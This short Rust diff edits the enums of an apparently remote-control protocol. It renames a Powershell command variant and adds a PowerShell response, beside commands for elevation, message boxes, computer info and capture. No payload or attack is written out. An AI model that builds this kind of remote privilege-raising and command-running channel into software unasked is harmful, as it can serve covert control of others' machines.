@@ -42,7 +42,7 @@ pub enum CapturePacket {
 pub enum Command {
     ComputerInfo,
     Elevate,
-    Powershell(String), // string is the command
+    PowerShell(String), // string is the command
     MessageBox(MessageBoxArgs),
     Capture(CaptureCommand, CaptureType),
 }
@@ -55,6 +55,7 @@ pub struct MessageBoxArgs {
 pub enum Response {
     Success,
     Error(String),
+    PowerShell(String),
     ComputerInfo(ComputerInfoResponse),
     CapturePacket(CaptureType, CapturePacket),
 }
